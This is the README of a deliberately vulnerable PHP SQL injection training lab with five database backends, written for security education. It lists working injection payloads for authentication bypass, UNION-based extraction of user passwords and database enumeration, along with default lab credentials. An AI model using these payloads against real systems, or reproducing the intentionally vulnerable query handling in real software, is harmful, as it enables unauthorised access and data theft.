# Multi-Database SQL Injection Lab

A comprehensive PHP-based web application designed for SQL injection testing and education. This lab supports **5 different database backends** (MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite) with seamless cookie-based switching between databases.

## 🎯 Features

- **Multi-Database Support**: Switch between MySQL, PostgreSQL, MSSQL, Oracle, and SQLite
- **Cookie-Based Database Switching**: Change databases on-the-fly via cookie
- **User Authentication**: Complete registration and login system
- **CRUD Operations**: Full Create, Read, Update, Delete functionality for items
- **Intentional SQL Injection Vulnerability**: Search functionality with direct SQL concatenation
- **Docker Deployment**: Complete containerized setup with docker-compose
- **Modern UI**: Premium dark mode design with glassmorphism effects

## 🚀 Quick Start

### Prerequisites

- Docker Desktop installed
- Docker Compose installed
- At least 4GB of available RAM (Oracle database requires significant resources)

### Installation

1. **Clone or navigate to the project directory:**
   ```bash
   cd e:\Codeweb\lab\sqli
   ```

2. **Build and start all containers:**
   ```bash
   docker-compose up -d --build
   ```

3. **Wait for all databases to initialize** (first startup may take 5-10 minutes):
   ```bash
   docker-compose logs -f
   ```

4. **Access the application:**
   - Open your browser and navigate to: `http://localhost:8080`

### Default Credentials

- **Username**: `admin` or `testuser`
- **Password**: `password`

## 🗄️ Database Configuration

### Supported Databases

| Database | Port | Container Name |
|----------|------|----------------|
| MySQL 8.0 | 3306 | sqli_mysql |
| PostgreSQL 15 | 5432 | sqli_postgresql |
| MSSQL 2022 | 1433 | sqli_mssql |
| Oracle 21c XE | 1521 | sqli_oracle |
| SQLite | N/A | File-based |

### Switching Databases

1. **Via Web Interface**: Use the dropdown selector on the homepage or dashboard
2. **Via Cookie**: The `db_type` cookie controls which database is active
3. **Supported values**: `mysql`, `postgresql`, `mssql`, `oracle`, `sqlite`

## 🔓 SQL Injection Testing

### Vulnerable Endpoint

The **Search** functionality (`search.php`) is intentionally vulnerable to SQL injection attacks.

### Example Payloads

#### Basic Authentication Bypass
```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
```

#### Union-Based Injection (Extract User Data)

**MySQL / SQLite:**
```sql
' UNION SELECT id, username, password, email, created_at FROM users --
```

**PostgreSQL:**
```sql
' UNION SELECT id::text, username, password, email::text, created_at::text FROM users --
```

**Microsoft SQL Server:**
```sql
' UNION SELECT CAST(id AS NVARCHAR), username, password, CAST(email AS NVARCHAR), CAST(created_at AS NVARCHAR) FROM users --
```

**Oracle:**
```sql
' UNION SELECT TO_CHAR(id), username, password, email, TO_CHAR(created_at) FROM users --
```

#### Database-Specific Enumeration

**MySQL - Version Detection:**
```sql
' UNION SELECT 1,2,VERSION(),4,5 --
```

**PostgreSQL - Current Database:**
```sql
' UNION SELECT 1,2,current_database()::text,4,5 --
```

**MSSQL - Database Name:**
```sql
' UNION SELECT 1,2,DB_NAME(),4,5 --
```

**Oracle - Version:**
```sql
' UNION SELECT 1,2,banner,4,5 FROM v$version WHERE ROWNUM=1 --
```

## 📁 Project Structure

```
e:/Codeweb/lab/sqli/
├── docker-compose.yml          # Multi-container orchestration
├── Dockerfile                  # PHP container with all DB drivers
├── README.md                   # This file
├── public/                     # Web application root
│   ├── index.php              # Landing page with DB selector
│   ├── login.php              # User login
│   ├── register.php           # User registration
│   ├── dashboard.php          # CRUD interface
│   ├── search.php             # Vulnerable search (SQLi)
│   ├── logout.php             # Session destruction
│   └── css/
│       └── style.css          # Premium dark mode styling
├── includes/                   # Backend logic
│   ├── config.php             # Database credentials
│   ├── db.php                 # Connection manager
│   ├── functions.php          # Helper functions
│   └── session.php            # Session management
└── init/                       # Database initialization scripts
    ├── mysql.sql
    ├── postgresql.sql
    ├── mssql.sql
    ├── oracle.sql
    └── sqlite.sql
```

## 🛠️ Development

### Accessing Database Containers

**MySQL:**
```bash
docker exec -it sqli_mysql mysql -u sqli_user -psqli_pass123 sqli_db
```

**PostgreSQL:**
```bash
docker exec -it sqli_postgresql psql -U sqli_user -d sqli_db
```

**MSSQL:**
```bash
docker exec -it sqli_mssql /opt/mssql-tools18/bin/sqlcmd -S localhost -U sa -P 'SqliPass123!' -d sqli_db -C
```

**Oracle:**
```bash
docker exec -it sqli_oracle sqlplus sqli_user/sqli_pass123@XE
```

**SQLite:**
```bash
docker exec -it sqli_web sqlite3 /var/www/init/sqli.db
```

### Viewing Logs

```bash
# All containers
docker-compose logs -f

# Specific container
docker-compose logs -f web
docker-compose logs -f mysql
```

### Rebuilding Containers

```bash
# Rebuild and restart
docker-compose down
docker-compose up -d --build

# Clean rebuild (removes volumes)
docker-compose down -v
docker-compose up -d --build
```

## ⚠️ Security Warning

**THIS APPLICATION CONTAINS INTENTIONAL SECURITY VULNERABILITIES**

- **DO NOT** deploy this application to production environments
- **DO NOT** use this code in real-world applications
- This lab is designed **exclusively** for educational and security testing purposes
- The SQL injection vulnerability is intentional for learning purposes

## 🎓 Educational Use Cases

1. **SQL Injection Training**: Learn how SQLi works across different database systems
2. **Database Comparison**: Understand syntax differences between database engines
3. **Secure Coding Practice**: Study the vulnerable code and learn how to fix it
4. **Penetration Testing**: Practice exploitation techniques in a safe environment
5. **CTF Challenges**: Use as a base for capture-the-flag competitions

## 📝 License

This project is provided for educational purposes only. Use at your own risk.

## 🤝 Contributing

This is a security testing lab. If you find additional vulnerabilities or have suggestions for educational improvements, feel free to document them.

## 📧 Support

For issues or questions about setup, refer to the Docker logs or check database container status.

---

**Happy Testing! 🔐**
